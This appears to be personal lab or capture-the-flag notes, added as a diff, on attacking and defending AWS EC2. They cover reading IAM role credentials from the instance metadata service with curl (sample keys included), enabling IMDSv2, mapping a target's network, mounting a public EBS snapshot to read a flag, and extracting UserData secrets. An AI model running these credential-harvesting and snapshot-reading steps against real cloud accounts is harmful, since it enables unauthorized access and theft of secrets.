@@ -1,0 +1,119 @@
+Amazon EC2 - Attack & Defense
+Introduction: Amazon Elastic Compute Cloud (EC2) is AWS’s core computing service. It provides virtual machines, called instances.
+-------------------------------------------------------------------------------------------
+EC2 Instance Connect provides a browser-based ssh interface to EC2 instances. It leverages temporary SSH public/private key pairs deployed by an agent leveraging AWS IAM Permissions.
+Generally, the URL for Instance Connect is of the form:
+
+https://console.aws.amazon.com/ec2/v2/connect/$USERNAME/$INSTANCE_ID
+------------------------------------------------------------------------------------------
+Instance permissions
+
+The IMDS listens on the special IP address 169.254.169.254, part of the AWS Hypervisor.
+In order to retrieve credentials from the /security-credentials/ endpoint, you must specify the role name. AWS conveniently provides that via another call to /security-credentials/. Run these two commands to get the role name, store it in the environment variable role_name.
+
+Commands:
+role_name=$( curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ )
+echo "Role Name is $role_name"
+
+Ask for the session credentials for the role
+Command:
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+
+Output example:
+"Code" : "Success",
+  "LastUpdated" : "2025-09-18T17:47:32Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIAXPLNRTHCYGZ3FFC7",
+  "SecretAccessKey" : "Qr26Rxt5jdrVm36+iWi6hY4pHGFuDuzbym2tljwU"
+
+
+
+Now we should enable IMDSv2. Enabling IMDSv2 can be done via the instance you're connected to. The following three commands will:
+
+1) Get the Instance Id
+Command: instance_id=$( curl -s http://169.254.169.254/latest/meta-data/instance-id )
+
+2) Echo the Instance ID value back to you
+Command: echo "My Instance ID is $instance_id" - i-013fb862b75fc4acf
+
+3) Update the Instance Metadata options to require a Token to make the instance metadata call
+Command: aws ec2 modify-instance-metadata-options --instance-id $instance_id --http-tokens required --region us-east-1
+
+4) The final command is an authenticated command to the EC2 Service that will enable IMDSv2 by setting the http-tokens required field to true. 
+Command: TOKEN=`curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+echo $TOKEN
+
+5) Now you can get credentials.
+Command: role_name=$( curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ )
+echo "Role Name is $role_name"
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/${role_name}
+
+OutputExample:
+{
+  "Code" : "Success",
+  "LastUpdated" : "2025-09-18T17:47:02Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIAXPLNRTHCZRX3QDZO",
+  "SecretAccessKey" : "4sP8yTGy7Z1oVvTjPTTlGjmbTid6wv7B5QhioVxX",
+
+------------------------------------------------------------------------------------------
+
+List ENI (Elastic Network Interfaces)
+Command: aws ec2 describe-network-interfaces | jq '.NetworkInterfaces[0]'
+
+The commmand above provides a wealth of helpful information if you're trying to understand the network topology of a target's cloud infrastructure. You get the public IP, Private IP, and Instance ID, but you also get the name and ID of the Security Group, Subnet, and VPC 
+
+-----------------------------------------------------------------------------------------
+Attacking EC2 Storage (EBS Volumes)
+In this exercise, we will create a volume from a public snapshot, mount that volume onto our EC2 Instance, then read the data from that snapshot.
+
+1) Look at the snapshots created
+Command: aws ec2 describe-snapshots --snapshot-ids snap-051a9c27b12a797a4
+
+Detect volumes with "Encrypted": false! 
+
+2) Create a volume from this snapshot
+*Snapshots exist in an AWS Region, but a Volume must be in the same Availability Zone (AZ)*
+Command: TOKEN=`curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+echo $TOKEN
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/placement/availability-zone
+us-east-1c
+
+Now we create a volume from the snapshot. We'll specify the gp3 volume type (because it's cheaper).
+Command: aws ec2 create-volume --snapshot-id snap-051a9c27b12a797a4 --volume-type gp3 --region us-east-1 --availability-zone REPLACE-ME-WITH-YOUR-AZ
+
+Note the volume ID in the above output. We need that to attach the volume to our Instance.
+Example output:  "VolumeId": "vol-006b788a34e209d54",
+
+Command: instance_id=$( curl  -H "X-aws-ec2-metadata-token: $TOKEN" -s http://169.254.169.254/latest/meta-data/instance-id )
+aws ec2 attach-volume --region us-east-1 --device /dev/sdh --instance-id $instance_id --volume-id vol-REPLACE-ME-WITH-YOUR-VolumeId
+
+3) Create a mount point, mount the disk
+Command: sudo mkdir /snapshot-recovery
+sudo mount /dev/nvme1n1 /snapshot-recovery
+ls /snapshot-recovery
+cat /snapshot-recovery/flag.txt
+
+------------------------------------------------------------------------------------------
+EC2 Configuration
+
+1) List AMIs
+Command: aws ec2 describe-images --owners 019181489476
+
+One of the ways an EC2 Instance can be configured at launch time is via UserData. UserData is part of the cloud-Init package that several public and private cloud providers use.
+
+Important things:
+1) Because it is used for configuration, it often contains secrets or other configuration information useful for a penetration tester or attacker.
+2) It is executed on boot when it is changed. This means if you have permission to modify the UserData script, you can execute arbitrary commands on the instance when it's rebooted.
+
+There are two ways to get the user-data. If you're on the machine (via EC2 Instance Connect or the SSM Session Manager console), you can do a curl for it:
+
+1) Command: curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data
+2) Look in /var/lib/cloud/instance/scripts/part-001 - That requires using su or sudo to read the file as root
+
+Commands:
+TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+instance_id=$( curl -H "X-aws-ec2-metadata-token: $TOKEN" -s http://169.254.169.254/latest/meta-data/instance-id )
+aws ec2 describe-instance-attribute --attribute userData --instance-id $instance_id --region us-east-1 --query UserData --output text  | base64 -d
+
+The final command takes the output of the describe-instance-attribute call, filters out the specific field of UserData (--query UserData), and then pipes that through a base64 decode to make the shell script readable.
